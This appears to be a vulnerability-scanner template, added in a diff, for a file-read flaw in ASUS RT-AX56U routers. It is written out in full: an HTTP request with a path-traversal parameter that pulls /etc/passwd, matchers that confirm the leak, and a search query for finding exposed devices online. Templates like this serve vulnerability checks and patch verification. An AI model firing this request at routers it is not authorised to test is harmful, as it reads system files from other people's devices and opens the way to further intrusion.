@@ -1,0 +1,31 @@
+id: asus-route-error_page-fileread
+info:
+  name: asus-route-error_page-fileread
+  author: unknow
+  severity: critical
+  description: 华硕 RT-AX56U系列路由器 error_page 存在文件读取漏洞。
+  tags: asus,fileread
+  metadata:
+    fofa-query: banner="ASUS RT-AX56U" || (body="RT-AX56U" && title=="ASUS Login")
+
+http:
+  - raw:
+      - |
+        GET /error_page.htm?current_lang=/////etc/passwd HTTP/1.1
+        Connection: close
+        Content-Length: 0
+        User-Agent: Mozilla/5.0
+        Referer: https://127.0.0.1/Main_Login.asp
+
+    extractors:
+      - type: regex
+        name: fileread
+        part: body
+        regex:
+          - "root:/bin/sh(.*)"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains(body, "root:/bin/sh") && contains(header, "text/html")'
